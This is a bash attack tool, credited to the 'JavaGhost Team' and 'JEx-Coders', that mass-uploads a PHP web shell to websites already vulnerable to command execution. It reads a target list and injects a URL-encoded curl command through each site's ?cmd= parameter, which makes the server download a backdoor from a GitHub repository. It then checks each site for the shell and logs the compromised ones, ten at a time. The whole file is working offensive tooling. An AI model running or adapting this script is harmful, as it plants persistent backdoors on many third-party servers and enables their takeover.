# !/bin/bash
# tools auto upload shell from php cmd RCE ( shell.php?cmd=command )
# don't edit or rewrite if you not understand
# created by : ./Lolz ( https://fb.me/n00b.me - JavaGhost Team )
#Recoded By : JEx-Coders


# color(bold)
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

cat << "EOF"
        _______________________________________
       |,---"-----------------------------"---,|
       ||___    C:/user/bot...........[-÷x]   ||
       ||====\ :HHHHHHHHHHHHHHHHHHHHHHHHHHH   ||
       ||=====):H > Recoded By JEx-Coders H   ||
       ||====/ :H >        MASERCE        H   ||
       ||"""   :H >    [  JavaGhost  ]    H   ||
       ||      :H >   [  XploitSec-ID  ]  H   ||
       ||      :HHHHHHHHHHHHHHHHHHHHHHHHHHH   ||
       ||_____,_________________________,_____||
       |)_____)-----.|.RoBot.exe|.------(_____(|
     //"""""""|_____|=----------=|______|"""""""\
    // _| _| _| _| _| _| _| _| _| _| _| _| _| _| \
   // ___| _| _| _| _| _| _| _| _| _| _| _|  |  | \
  |/ ___| _| _| _| _| _| _| _| _| _| _| _| ______| \
  / __| _| _| _| _| _| _| _| _| _| _| _| _| _| ___| \
 / _| _| _| _| ________________________| _| _| _| _| \
|------"--------------------------------------"-------|
`-----------------------------------------------------'
   --[+]        Mass Upload Shell From RCE        [+]--
 
EOF

shell="curl%20https%3A%2F%2Fraw.githubusercontent.com%2FJExCoders%2FPHP-BACKDOOR%2Fmaster%2F0byt3m1n1.php%20-o%200byte.php" # this your shell ( url encode )

# create file
touch Good_results.txt Bad_results.txt # Bad_results.txt : file for saved list can't upload shell ( so u need manual upload )

# start
# banner
echo -e $'''
Mass upload shell from php cmd RCE \e[1;31m(\e[1;32m shell.php?cmd= \e[1;31m)\e[1;37m
'''

# ask list file
read -p $'\e[1;37m[\e[1;31m?\e[1;37m] Input your list \e[1;31m:\e[1;32m ' ask_list
cat $ask_list | sed "s|http://||g;s|https://||g" > list.tmp

# check file
if [[ ! -e $ask_list ]]; then
	#statements
	echo -e "${white}[${red}!${white}] Error! - $ask_list ${red}:${green} Not found!${white}"
	exit
else
	echo -e "${white}[${red}+${white}] Total your list ${red}:${green} $(< $ask_list wc -l)${white}\n"
fi

# function
function execute(){
	curl --connect-timeout 120 --max-time 120 --user-agent "JavaGhost" -sk "$(echo "${list}" | grep -ao "^.*=")${shell}" >/dev/null 2>&1
	c_shell=$(curl --connect-timeout 120 --max-time 120 --user-agent "JavaGhost" -sk "$(echo "${list}" | sed "s|vuln.php?cmd=.*|0byte.php|g")" | grep -o "?option&path=" | head -n1) # checking shell
	if [[ $c_shell == "?option&path=" ]]; then
		shell_name=$(curl --connect-timeout 120 --max-time 120 -s "$(echo "${list}" | sed "s|vuln.php?cmd=.*|0byte.php|g")" | grep -o "<title>.*" | cut -d ">" -f2 | cut -d "<" -f1)
		echo -e "${white}[${green}+${white}] $(echo "${list}" | cut -d "/" -f1,2,3) ${blue}=>${green} $(echo "${list}" | sed "s|vuln.php?cmd=.*|0byte.php|g") ${red}:${green} Uploaded! ${red}[${white} Shell name ${blue}:${green} ${shell_name} ${red}]${white}" | sed "s/Vuln!!//g"
		echo "$(echo "${list}" | sed "s|vuln.php?cmd=.*|0byte.php|g")" >> Good_results.txt
	else
		echo -e "${white}[${green}-${white}] $(echo "${list}" | cut -d "/" -f1,2,3) ${blue}:${red} Not Uploaded!${white}" | sed "s/Vuln!!//g;s/Shell Access!//g"
		echo "$(echo "${list}" | sed "s|vuln.php?cmd=.*|0byte.php|g")" >> Bad_results.txt
	fi

}

# multithreading
(
	for list in $(cat list.tmp); do
		((thread=thread%10)); ((thread++==0)) && wait
		execute "$list" &
	done
	wait
)

echo -ne "\n${white}[${red}!${white}] Good results ${red}+${white} Bad results saved in ${red}:${green} $(pwd) ${red}-${white} Total ${red}:${white} good results ${red}:${green} $(< Good_results.txt wc -l) ${red}-${white} bad results ${red}:${green} $(< Bad_results.txt wc -l)${white}"
# end
